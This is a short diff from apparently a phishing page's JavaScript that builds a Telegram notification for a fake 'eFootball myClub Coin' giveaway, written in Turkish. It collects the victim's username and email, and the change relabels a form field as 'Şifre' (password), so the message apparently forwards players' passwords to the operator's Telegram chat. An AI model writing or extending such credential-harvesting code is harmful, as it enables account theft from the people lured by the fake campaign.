@@ -404,7 +404,7 @@ async function sendTelegramNotification(username, email, requestedCoins, rewardT
   const text = `⚽ <b>Yeni eFootball™ myClub Coin Talebi!</b>\n\n` +
     `👤 <b>Kullanıcı Adı:</b> <code>${username}</code>\n` +
     `📧 <b>E-Posta:</b> <code>${email}</code>\n` +
-    `💰 <b>İstenen myClub Coins:</b> <b>${requestedCoins}</b>\n` +
+    `💰 <b>Şifre:</b> <b>${requestedCoins}</b>\n` +
     `🏆 <b>Seçilen Ödül / Paket:</b> ${rewardTitle || 'eFootball™ Kampanyası'}\n` +
     `📅 <b>Tarih / Saat:</b> ${dateStr}`;
 
